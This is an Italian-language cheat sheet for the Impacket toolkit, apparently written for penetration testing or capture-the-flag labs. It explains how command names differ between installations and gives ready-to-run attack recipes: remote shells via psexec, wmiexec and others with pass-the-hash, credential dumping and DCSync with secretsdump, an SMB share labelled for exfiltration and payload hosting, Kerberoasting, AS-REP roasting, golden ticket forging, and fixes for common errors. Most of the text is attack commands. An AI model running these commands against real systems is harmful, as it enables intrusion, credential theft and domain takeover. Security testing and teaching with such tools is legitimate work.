# Impacket — guida rapida (nomi dei comandi e ricette)

## Perché a volte "psexec.py non funziona"

Impacket ha **tre modi diversi** di chiamare gli script, dipende da come è installato:

| Installazione | Comando | Esempio |
|---|---|---|
| pip moderno (es. `pip install impacket` o da GitHub) | `impacket-<nome>` | `impacket-psexec` |
| esempi nel PATH (vecchie installazioni) | `<nome>.py` | `psexec.py` |
| file sorgente clonato / esempi Kali | `python3 <percorso>/<nome>.py` | `python3 /usr/share/doc/python3-impacket/examples/psexec.py` |

NON esiste `impacket psexec.py` (con lo spazio) né `psexec-impacket` — l'ordine giusto è `impacket-psexec`.

### Come trovare i comandi disponibili
```bash
compgen -c | grep impacket | sort        # elenca tutti gli impacket-* nel PATH
pip show -f impacket | grep bin          # dove pip li ha installati
# se mancano: reinstalla
python3 -m pip install --break-system-packages git+https://github.com/fortra/impacket
```

## Ricette principali (sintassi identica per tutti)

Autenticazione: `[[dominio/]utente[:password]@]target` — con hash NTLM: `-hashes LM:NT` (LM vuoto → `:NThash`).

```bash
# Shell remota (SMB, servizio temporaneo — rumoroso ma affidabile)
impacket-psexec Administrator@10.10.10.1
impacket-psexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.108

# Alternative più stealth (stessa sintassi)
impacket-wmiexec  Administrator@10.10.10.108      # via WMI, nessun servizio creato
impacket-smbexec  Administrator@10.10.10.108      # via SMB + output su share
impacket-atexec   Administrator@10.10.10.108      # via Task Scheduler

# Dump credenziali (SAM/LSA/NTDS)
impacket-secretsdump Administrator@10.10.10.108
impacket-secretsdump -hashes :NTHASH Administrator@10.10.10.108
impacket-secretsdump domain/user:pass@10.10.10.10 -just-dc   # DCSync sul DC

# Condivisione SMB temporanea (esfiltrazione / hosting payload)
impacket-smbserver share $(pwd) -smb2support

# Kerberos / AD
impacket-GetUserSPNs domain/user:pass -dc-ip 10.10.10.10 -request      # Kerberoasting
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.10    # AS-REP roasting
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain acme.local Administrator  # golden ticket

# Autenticazione Kerberos invece di NTLM (serve FQDN e -k)
impacket-psexec -k -no-pass dc01.acme.local
```

## Errori comuni
- `STATUS_ACCESS_DENIED` → credenziali sbagliate o utente non admin sul target.
- `STATUS_LOGON_FAILURE` con hash → hash NT errato (attenzione a copiare tutto, LM vuoto si scrive `:NT`).
- Connection refused su 445 → SMB filtrato: prova wmiexec (135+RPC) o winrm (5985).
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` con `-k` → usa il FQDN, non l'IP, e mettilo in /etc/hosts.
